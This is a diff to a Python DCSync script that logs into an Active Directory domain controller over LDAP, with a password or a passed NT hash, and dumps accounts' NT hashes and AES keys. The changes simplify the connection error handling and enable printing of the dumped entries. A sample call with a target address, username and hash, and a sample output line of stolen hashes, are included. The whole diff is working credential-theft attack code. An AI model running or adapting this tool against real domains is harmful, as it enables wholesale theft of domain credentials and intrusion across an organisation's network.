@@ -31,12 +31,9 @@ def dcsync(target, username, domain, password='', nthash=''):
 
     try:
         ldapConnection = LDAPConnection(f'ldap://{target}', base_dn, target)
-    except LDAPSessionError as e:
-        if str(e).find('strongerAuthRequired') >= 0: # Trying ssl
-            ldapConnection = LDAPConnection(f'ldaps://{target}', base_dn, target)
-        else:
-            print("LDAP connection error.", file=sys.stderr)
-            return None
+    except:
+        print("LDAP connection error, the target provided must be the DC.", file=sys.stderr)
+        return None
         
     # Login can't fail if it succeded with smb
     ldapConnection.login(user=username, password=password, domain=domain, nthash=nthash)
@@ -108,5 +105,5 @@ dcsync_out = dcsync(target="192.168.56.133", username="d.garza", nthash="5a64201
 
 # Output is a list of dict in the following format:
 # [{'username':'l.douglas', 'rid':'1652', 'nthash':'e3162fc537e66f4dc1287271cdbec59b', 'aes_256':'5db0df75e081189715afe6c7bd14436e6a068365a212244a7f904e1178b8b310'}]
-#for entry in dcsync_out:
-#    print(entry)
+for entry in dcsync_out:
+    print(entry)
